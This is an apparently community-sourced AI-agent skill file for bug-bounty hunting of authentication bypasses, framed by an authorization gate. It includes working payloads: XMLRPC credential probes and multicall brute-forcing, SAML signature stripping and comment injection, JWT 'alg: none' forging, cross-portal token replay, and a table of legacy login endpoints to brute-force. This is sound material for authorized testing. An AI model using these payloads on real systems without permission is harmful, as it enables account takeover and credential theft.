---
name: hunt-auth-bypass
description: Hunting skill for auth bypass vulnerabilities.
category: security
risk: offensive
source: https://github.com/elementalsouls/Claude-BugHunter
source_repo: elementalsouls/Claude-BugHunter
source_type: community
date_added: '2026-09-20'
license: MIT
license_source: https://github.com/elementalsouls/Claude-BugHunter/blob/main/LICENSE
compatibility: Requires explicit written authorization for a target scope plus the
  relevant testing tools for this technique. Docs-only; helper scripts and commands
  not bundled.
sources: github, hackerone_public, github_security_lab, projectdiscovery_research
report_count: 12
---
> **⚠️ AUTHORIZED USE ONLY**
> This skill is for educational purposes or authorized security assessments only.
> You must have explicit, written permission from the system owner before using this tool.
> Misuse of this tool is illegal and strictly prohibited.

> **Mandatory confirmation gate**
> Before running any command that probes, exploits, changes, persists on, extracts data from, or attempts credential access against a target:
> 1. Ask the user to state the exact target URL, IP, account, or resource.
> 2. Ask the user to confirm written authorization and the permitted scope.
> 3. Show the exact command(s) and explain their expected effect.
> 4. Wait for explicit confirmation in the current conversation.
>
> Without that confirmation, remain read-only and provide defensive guidance only. Prefer a sandbox, disposable VM, or controlled lab.

## Crown Jewel Targets

Auth bypass is consistently one of the highest-paying vulnerability classes in bug bounty because it directly violates the most fundamental security control. High-value targets include:

- **SSO/SAML implementations** at enterprise SaaS companies (Slack, Okta, OneLogin integrations) — payouts regularly in the $5K–$25K+ range
- **Admin panels and partner/internal portals** — subdomain-separated admin surfaces like `partners.shopify.com`, `admin.company.com`
- **Third-party auth plugin integrations** — WordPress plugins (OneLogin, WP-SAML-Auth), Drupal SSO modules, any CMS with pluggable auth
- **XMLRPC endpoints** on WordPress — often forgotten, bypasses standard WP auth flows entirely
- **OAuth callback flows** — state parameter mishandling, redirect_uri mismatches
- **API authentication layers** — especially where auth was bolted on after the fact

**Asset priority:** Targets with federated identity (SAML, OAuth, OIDC) connected to large user populations. Partner/reseller portals are particularly juicy because they often have elevated permissions and less security scrutiny than the main product.

---

### SSH certificate-authority trust forgery (Git-hosting / enterprise platforms)
When an org or instance registers an SSH certificate authority, cert `principals` may not be bound server-side to the requesting identity — a member can mint a cert asserting another user's principal and authenticate as them (e.g. modify another user's resource given only its URL). Add SSH-CA trust to the auth-surface list on Git-hosting targets; niche/platform-specific. Disclosed: reports/1901040.

## Attack Surface Signals

**URL patterns to hunt:**
```
/xmlrpc.php
/wp-login.php
/saml/
/sso/
/auth/saml/callback
/oauth/callback
/partners.*
/admin.*
/?wc-api=
/api/v*/auth
/login?redirect=
/accounts/login
```

**Response headers signaling SSO:**
```
X-Frame-Options: SAMEORIGIN (common on SSO portals)
Set-Cookie: SAMLResponse=
Location: https://idp.company.com/saml
WWW-Authenticate: Bearer realm="partners"
```

**JS patterns indicating federated auth:**
```javascript
// Look for in page source
samlRequest
RelayState
SAMLResponse
onelogin
shibboleth
okta
passport.js authenticate
```

**Tech stack signals:**
- WordPress + any SSO plugin → check XMLRPC separately
- Shopify Partner API exposure → cross-tenant privilege escalation risk
- Any app advertising "SSO enabled" or "Login with [Enterprise IdP]"
- Separate subdomains for admin/partner that share session cookies with main domain
- Applications using `SimpleSAMLphp`, `ruby-saml`, `python-saml`

**Burp passive scan triggers:**
- `SAMLResponse` in any POST body
- `openid_connect` or `id_token` in responses
- Cookie domains set to `.company.com` (wildcard)

---

## Step-by-Step Hunting Methodology

1. **Map all authentication entry points**
   - spider the target for every login surface: main login, admin login, API login, partner portal, mobile API endpoints
   - check `robots.txt`, JS files, and the wayback machine for forgotten endpoints like `/xmlrpc.php`

2. **Identify the auth mechanism per entry point**
   - Is it forms-based, SAML, OAuth, API key, session token?
   - For WordPress: always probe `/xmlrpc.php` even if the main login is SSO-protected

3. **Test XMLRPC independently of SSO**
   - If site uses SSO (e.g., OneLogin), manually POST to `/xmlrpc.php`
   - XMLRPC uses WordPress-native credentials, not SSO — test with `system.listMethods` first, then `wp.getUsersBlogs`

4. **Enumerate SAML implementation**
   - Capture a valid SAMLResponse via Burp
   - Decode the Base64 payload, inspect the XML
   - Test signature stripping, comment injection, and XML wrapping attacks
   - Test if SP validates the signature at all (send unsigned assertion)

5. **Test cross-portal session/token reuse**
   - Log into `partners.shopify.com` type portals
   - Attempt to use the issued token/cookie against the main admin portal
   - Look for shared cookie domains, shared JWT secrets, or API tokens that work across contexts

6. **Fuzz auth parameters**
   - Null/empty passwords, `password[]=array`, SQL in username field
   - Try `admin`/`admin`, `test`/`test` on staging subdomains
   - Modify `role`, `is_admin`, `user_type` in JWTs (none algorithm, weak secret)

7. **Check redirect and state parameters**
   - Does removing `state` from OAuth break anything?
   - Can you change `redirect_uri` to an open redirect target?
   - Does the `RelayState` in SAML get validated?

8. **Verify impact by escalating privileges**
   - Don't stop at login — prove you can access admin functions, other users' data, or sensitive configuration
   - Screenshot the highest-privilege action you can perform

---

## Legacy-Protocol Matrix (Probe These First on Any Custom-Branded Login)

When a target has a custom, branded login UI (e.g. `customlogin.aspx`, `/auth/signin`, `/account/login`), **always probe the platform's legacy protocol endpoints with native credentials** in parallel. These endpoints frequently outlive the custom UI's protections and accept native credentials with NO rate limit, NO MFA challenge, NO CAPTCHA, NO anti-automation. This is the WordPress XMLRPC pattern generalised across CMS / portal / framework stacks.

| Target tech | Legacy endpoint(s) to probe | Native-cred bypass surface |
|---|---|---|
| **WordPress** | `/xmlrpc.php` (`system.listMethods`, `wp.getUsersBlogs`, `system.multicall`) | Native WP user/pass; bypasses SSO, MFA, IP-allow rules on `/wp-login.php` |
| **WordPress (REST)** | `/?rest_route=/wp/v2/users`, `/wp-json/wp/v2/users` | User enumeration anonymously even when login page is hardened |
| **SharePoint (any version)** | `/_vti_bin/Authentication.asmx` (`Mode` + `Login` SOAP ops) | Native Forms-auth credential; FedAuth cookie returned; no rate limit on this endpoint observed on SP2013 farms — **this is the canonical SP equivalent of the WP XMLRPC bypass** |
| **SharePoint legacy** | `/_vti_bin/_vti_aut/author.dll`, `/_vti_bin/_vti_adm/admin.dll`, `/_vti_bin/owssvr.dll` | FrontPage RPC; sometimes still wired to credential validators |
| **SharePoint REST** | `/_api/contextinfo` (POST), `/_api/$metadata` | Anonymous FormDigest issuance; full API surface enumeration |
| **Atlassian (Jira / Confluence)** | `/rest/auth/1/session` (basic-auth), `/rest/api/2/myself`, legacy `/rest/api/1.0/` | Native credentials accepted on `/rest/auth/1/session` even when Atlassian Crowd / Atlassian Access SSO is enforced on the UI |
| **Drupal** | `/jsonapi/`, `/user/login?_format=json` | JSON POST endpoint that accepts native passwords; separate from SSO middleware |
| **Drupal (D7 legacy)** | `/?q=user/login`, `/services/`, `/rest/` | Older REST modules with independent auth |
| **Joomla** | `/administrator/index.php?option=com_login`, `/api/index.php/v1/users` | Native Joomla credentials accepted on admin entry independent of any front-site SSO |
| **Exchange / OWA** | `/EWS/Exchange.asmx`, `/Autodiscover/Autodiscover.xml`, `/Microsoft-Server-ActiveSync` | NTLM / Basic; bypasses OWA UI restrictions (MFA, IP-allow). The classic CVE-2020-0688 / CVE-2021-26855 surface |
| **Citrix NetScaler** | `/vpn/index.html`, `/cgi/login`, `/nf/auth/doAuthentication.do` | Native AD credentials; independent of MFA wrappers |
| **F5 BIG-IP** | `/mgmt/tm/util/bash`, `/tmui/login.jsp` | Native admin credentials |
| **Generic ASP.NET app** | `*.asmx?WSDL`, `*.svc?WSDL`, `trace.axd`, `elmah.axd`, `.disco` | Find every web service; many take credentials independently of the WebForms login |
| **Spring Boot** | `/actuator/*`, `/management/*`, `/api/v1/auth/login`, `/api/v1/swagger-ui` | Actuator endpoints sometimes anonymously enumerable |
| **Jenkins** | `/jnlpJars/jenkins-cli.jar`, `/script`, `/manage`, `/computer/(master)/script` | API tokens + native auth |
| **GitLab** | `/api/v3/*` (deprecated but still on old installs), `/api/v4/users`, `/api/v4/projects` | Personal Access Tokens with looser scoping than UI session |
| **TeamCity** | `/app/rest/users`, `/login.html?username=&password=` (GET-form-login) | Native admin credentials |
| **Apache Tomcat** | `/manager/html`, `/host-manager/html`, `/manager/text/list` | Native Tomcat realm credentials independent of any front auth |
| **WebLogic** | `/console/login/LoginForm.jsp`, `/wls-wsat/*` | Native admin |
| **Oracle EBS / PeopleSoft** | `/OA_HTML/AppsLogin`, `/psp/*/?cmd=login` | Native ERP credentials |

**How to use:**
1. Identify the tech stack from headers + paths (use `hunt-misc` Attack Surface Signals).
2. Find the row above that matches.
3. Probe the legacy endpoint anonymously to confirm it's reachable and not 403/404.
4. Test with synthetic credentials to confirm it accepts native credential format and returns differential responses (success vs failure).
5. Verify there is no rate limit, no lockout, no CAPTCHA — burst 10 requests at the same user, confirm uniform timing.
6. Report as **Critical / High** depending on chain to ATO: an anonymous + unlimited credential brute-force endpoint is consistently Critical on bug-bounty programs.

**Lesson from a authorized engagement:** A an enterprise dealer portal on SharePoint 2013 had a custom branded `customlogin.aspx`. The hunt-auth-bypass skill was loaded but the matrix above did not exist in this document — and the WordPress XMLRPC pattern was not connected to the SharePoint equivalent. `/_vti_bin/Authentication.asmx` was reachable anonymously, accepted unlimited credential attempts with no rate limit and no lockout, and was the highest-impact finding in the engagement. Walking this matrix on the first pass would have surfaced it immediately.

---

## Payload & Detection Patterns

**XMLRPC auth probe (bypasses SSO):**
```bash
curl -s -X POST https://target.com/xmlrpc.php \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?>
<methodCall>
  <methodName>system.listMethods</methodName>
  <params></params>
</methodCall>'

# If 200 with method list → XMLRPC is enabled, test auth:
curl -s -X POST https://target.com/xmlrpc.php \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?>
<methodCall>
  <methodName>wp.getUsersBlogs</methodName>
  <params>
    <param><value><string>admin</string></value></param>
    <param><value><string>password</string></value></param>
  </params>
</methodCall>'
```

**SAML signature stripping (send unsigned assertion):**
```python
import base64, re

# Decode captured SAMLResponse
saml_b64 = "BASE64_FROM_BURP"
saml_xml = base64.b64decode(saml_b64).decode()

# Strip the Signature element entirely
stripped = re.sub(r'<ds:Signature.*?</ds:Signature>', '', saml_xml, flags=re.DOTALL)

# Re-encode and submit
print(base64.b64encode(stripped.encode()).decode())
```

**SAML XML comment injection (username confusion):**
```xml
<!-- Original NameID -->
<NameID>attacker@evil.com</NameID>

<!-- Injected to confuse parser -->
<NameID>attacker@evil.com<!---->.victim@company.com</NameID>

<!-- Or namespace confusion -->
<NameID xmlns:evil="http://evil.com">victim@company.com</NameID>
```

**Partner/cross-portal token reuse test:**
```bash
# Get token from partner portal
TOKEN=$(curl -s -X POST https://partners.target.com/login \
  -d 'email=attacker@test.com&password=pass' \
  -c cookies.txt | grep -o 'token=[^;]*')

# Replay against admin portal
curl -s https://admin.target.com/dashboard \
  -H "Authorization: Bearer $TOKEN" \
  -H "Cookie: $TOKEN"
```

**JWT none algorithm attack:**
```python
import base64, json

header = base64.b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).decode().rstrip('=')
payload = base64.b64encode(json.dumps({"user_id":1,"role":"admin","email":"victim@company.com"}).encode()).decode().rstrip('=')
token = f"{header}.{payload}."
print(token)
```

**Grep patterns for auth bypass surface:**
```bash
# Find XMLRPC in scope
grep -r "xmlrpc" scope_urls.txt

# Find SSO indicators in JS
grep -rE "(SAMLResponse|samlRequest|RelayState|onelogin|shibboleth)" *.js

# Find partner/admin subdomains
subfinder -d target.com | grep -E "(admin|partner|internal|sso|auth|login)"
```

---

## Common Root Causes

1. **SSO bypasses local auth entirely at the UI layer, but not at the API layer** — developers disable the login form but forget that API endpoints (`/xmlrpc.php`, REST API, mobile API) have their own auth handlers that still accept native credentials.

2. **SAML signature validation is skipped or optional** — library defaults often don't enforce signature checking; developers use `wantAssertionsSigned: false` or fail to configure the IdP certificate correctly.

3. **Shared session infrastructure across different trust levels** — partner portals and admin portals reuse the same session cookie or JWT secret because they're built on the same internal framework, assuming access control at the application layer is sufficient.

4. **Trust inheritance in multi-tenant architectures** — a token issued in a lower-privilege context (partner, reseller) is accepted in a higher-privilege context because the verification only checks signature validity, not the issuance context.

5. **Plugin/module auth is independent of application auth** — every WordPress plugin that handles auth (contact forms, REST API extensions, WooCommerce) may implement its own auth handler inconsistently with the main site's SSO.

6. **XML parsing inconsistencies** — different XML parsers (used by SP vs. IdP) handle comments, namespaces, and whitespace differently, enabling confusion attacks where the signed content differs from the evaluated content.

---

## Bypass Techniques

| Defense | Bypass |
|---|---|
| SSO enforced on login page | Probe alternate entry points: XMLRPC, REST API, mobile API, legacy endpoints |
| SAML signature validation | XML comment injection, namespace wrapping, signature wrapping (XSW), remove signature entirely |
| IP allowlisting on admin portal | Use partner portal token if it shares auth backend |
| Rate limiting on login | XMLRPC allows credential stuffing via `system.multicall` — batches hundreds of auth attempts in one request |
| CSRF token on login form | SAML flow is POST-based cross-origin by design; no CSRF token needed on `/saml/callback` |
| JWT signature validation | `alg: none`, key confusion (RS256 → HS256 with public key as secret), brute-force weak secrets |
| Separate session stores per portal | Check if cookie domain is `.target.com` (wildcard) — cookie bleeds between subdomains |
| MFA on primary login | If SAML SP doesn't enforce MFA at the assertion level and accepts pre-auth assertions, MFA can be skipped |

**XMLRPC multicall for mass auth bypass:**
```xml
<methodCall>
  <methodName>system.multicall</methodName>
  <params><param><value><array><data>
    <value><struct>
      <member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
      <member><name>params</name><value><array><data>
        <value><string>admin</string></value>
        <value><string>password1</string></value>
      </data></array></value></member>
    </struct></value>
    <!-- repeat for each credential pair -->
  </data></array></value></param></params>
</methodCall>
```

---

## Gate 0 Validation

Before writing any report, answer these three questions:

1. **What can the attacker DO right now?**
   Must be: authenticate as another user OR authenticate without valid credentials OR elevate to admin/privileged role. "Partial information disclosure" is not auth bypass.

2. **What does the victim LOSE?**
   Must identify a concrete asset: account takeover of specific user, access to all admin functions, ability to read/modify other tenants' data, or access to privileged APIs. Abstract "security control bypass" without impact is not sufficient.

3. **Can it be reproduced in 10 minutes from scratch?**
   You must be able to: (a) start from a fresh browser/session, (b) follow your exact steps, and (c) arrive at authenticated access to a protected resource. If reproduction requires special preconditions you can't re-create (a specific victim's active session, timing windows), the report needs more work.

---

## Real Impact Examples

**Scenario 1 — SSO Enforcement Bypassed via Forgotten Protocol Endpoint**
A large ride-sharing company enforced SSO (via OneLogin) on all WordPress-based internal/public properties. The XMLRPC endpoint (`/xmlrpc.php`) remained active and accepted WordPress-native credentials entirely independent of the SSO flow. An attacker with any valid WP-native credentials (obtained via credential stuffing or from a previous breach) could authenticate directly through XMLRPC, bypassing MFA, SSO policies, and IP restrictions enforced on the main login form. Impact: Full authenticated access to all WordPress functions available to that user role, including content management and potentially admin functions.

**Scenario 2 — SAML Assertion Forgery via Signature Validation Failure**
A major enterprise communication platform's SAML SP implementation failed to properly validate assertion signatures in specific edge cases. By manipulating the XML structure of a captured SAMLResponse (specifically through comment injection or namespace prefix attacks), an attacker could modify the `NameID` value to impersonate any user in an organization — including workspace administrators — without possessing that user's credentials or private key material. Impact: Complete account takeover of any user within a SAML-enabled organization; attacker gains access to all messages, files, and integrations in the workspace.

**Scenario 3 — Cross-Portal Privilege Escalation via Shared Auth Backend**
An e-commerce platform's partner/reseller portal issued authentication tokens that were validated by the same backend service as the merchant admin portal. A partner-level account (lower trust, external-facing) could use its issued credentials or tokens to authenticate directly against admin-tier API endpoints, bypassing the merchant onboarding and permission assignment flow. Impact: A malicious partner could access any merchant's admin panel, modify store configurations, exfiltrate customer PII and payment data, or install malicious scripts — affecting thousands of merchant storefronts.

---

## Disclosed Report Citations (Backfill +8 — 2016-2025)

The following real, verified bug-bounty / coordinated-disclosure cases extend this skill. Spans 4 SAML subclasses, 4 JWT subclasses, 1 legacy-protocol (XMLRPC), and 2 partner-portal cross-domain reuse patterns.

5. **GitHub Enterprise Server — SAML XSW via parser differential (CVE-2025-25291/25292)** ([H1 #2579939](https://hackerone.com/reports/2579939) · [Blog](https://github.blog/security/sign-in-as-anyone-bypassing-saml-sso-authentication-with-parser-differentials/))
    - Subclass: SAML signature stripping / XSW (parser-differential variant)
    - Payload: signed SAML response; inject a sibling `<Assertion>` so REXML (signature-checker) and Nokogiri (business-logic reader) resolve different nodes via the same XPath. Signature validates against benign node; SP consumes attacker-controlled `<NameID>admin@target</NameID>`
    - Root cause: two XML parsers used for verification vs consumption return different elements for the same XPath
    - Year: 2025 — GitHub Security Lab bounty (program max class, internally rated Critical)

6. **GitHub Enterprise — SAML signature bypass on encrypted assertions (CVE-2024-4985)** ([H1 #2475347](https://hackerone.com/reports/2475347) · [ProjectDiscovery advisory](https://projectdiscovery.io/blog/github-enterprise-saml-authentication-bypass))
    - Subclass: SAML signature stripping (XSW family) when encrypted-assertions feature enabled
    - Payload: forge SAML response with attacker-controlled assertion; exploit improper signature verification on the encrypted-assertion code branch; provision arbitrary user including `site_admin`
    - Root cause: improper cryptographic signature verification on the encrypted-assertion code branch
    - Year: 2024 — bounty undisclosed, CVSS 10.0

7. **Uber — SAML auth bypass on `uchat.uberinternal.com`** ([H1 #223014](https://hackerone.com/reports/223014))
    - Subclass: SAML signature stripping / improper assertion verification (OneLogin SP-side)
    - Payload: replay/modify SAML assertion with forged `NameID`; SP did not strictly validate signature scope, so attacker-controlled assertion accepted, granting OneLogin SSO session to internal chat
    - Root cause: improper SAML signature verification on SP implementation
    - Year: 2017 — **$8,500**

8. **Uber — OneLogin SSO bypass via WordPress XMLRPC** ([H1 #138869](https://hackerone.com/reports/138869))
    - Subclass: WordPress XMLRPC bypassing SSO (legacy-auth path not gated) — canonical Legacy-Protocol Matrix case
    - Payload: OneLogin plugin auto-created WP users with literal password `@@@nopass@@@`. SSO plugin blocked `wp-login.php` only. POST `xmlrpc.php` with `wp.getUsersBlogs` + known shared password → authenticated as any previously-SSO'd user
    - Root cause: SSO enforcement applied at one auth surface (wp-login) but legacy XML-RPC path retained password auth with a guessable shared password
    - Year: 2016 — **$7,000**

9. **Slack — SAML "confused-deputy" assertion reuse** ([Writeup](http://blog.intothesymmetry.com/2017/10/slack-saml-authentication-bypass.html))
    - Subclass: partner-portal / cross-IdP assertion reuse (audience-restriction not validated)
    - Payload: take an old expired GitHub-signed SAML assertion (different audience, different subject) → present to Slack ACS → Slack logs attacker in as the asserted username
    - Root cause: no audience-restriction nor freshness check; trust extended across IdPs
    - Year: 2017 — **$3,000**

10. **HackerOne — SAML signup domain enforcement bypass via control characters** ([H1 #2101076](https://hackerone.com/reports/2101076))
    - Subclass: partner-portal / SAML domain-binding bypass via unicode control characters
    - Payload: new user sign-up at SAML-enforced org; append trailing control character (e.g., `\r`, ` `) to email → domain comparison normalises away, signup proceeds → unauthorised access to the org
    - Root cause: inconsistent unicode/control-char normalisation between domain check and identity write
    - Year: 2024 — bounty awarded (amount undisclosed)

11. **8x8 / Jitsi-Meet — JWT alg-confusion (asymmetric verifier accepts symmetric alg)** ([H1 #1210502](https://hackerone.com/reports/1210502))
    - Subclass: JWT alg-confusion (RS256 → HS256 using public key as HMAC secret)
    - Payload: server publishes RS256 verification public key. Send a token with header `{"alg":"HS256"}` signed with that public key as the HMAC secret → Prosody module validates and admits attacker into authenticated/moderator room
    - Root cause: verifier did not enforce `alg=RS256`; allowed symmetric algorithm using the public key as shared secret
    - Year: 2021 — bounty undisclosed

12. **Argo CD (Internet Bug Bounty) — JWT audience claim not validated (CVE-2023-22482)** ([H1 #1889161](https://hackerone.com/reports/1889161))
    - Subclass: token-scope / audience check at issuance not at use (cross-audience token confusion)
    - Payload: obtain any RS256-signed token signed by the cluster's OIDC issuer but minted for a different `aud` (e.g., `kubernetes`) → present it as bearer to Argo CD API → API treats it as valid because it accepted the issuer's signature and skipped `aud` enforcement
    - Root cause: `aud` claim not enforced; signature-trust extended across audiences
    - Year: 2023 — **$2,400** via IBB

---


## Contents

- [Duende BFF — Token-Confusion & Session-Fixation (2024-2026 surface)](references/details.md)
- [Function-Level Access Control (Broken Authorization)](references/details.md)
- [Related Skills & Chains](references/details.md)

## When to Use

- You have explicit, written authorization to assess the target in scope, and the task matches this skill's vulnerability class or technique within a bug-bounty or penetration-test engagement.
- You need the recon, exploitation, or validation workflow described below — executed strictly inside the approved scope.

## Limitations

- Authorized scope only: the confirmation gate above is mandatory before any probing, exploitation, or credential-access command.
- Docs-only import: upstream helper scripts, commands, engine, and research assets are not bundled; reinstall tooling from the source repo when needed.
- Validate every finding (see `triage-validation`) before reporting; report via `report-writing`. Prefer a sandbox, disposable VM, or controlled lab.

### Example

```bash
# Read-only first step; confirm scope before anything active.
cat scope.txt  # target list from the authorized engagement brief
```

> Adapted from [elementalsouls/Claude-BugHunter](https://github.com/elementalsouls/Claude-BugHunter) (MIT); frontmatter, When to Use/Limitations, and safety boundaries added for upstream compliance. Docs-only import: executable helpers, commands, engine, and research assets not bundled.
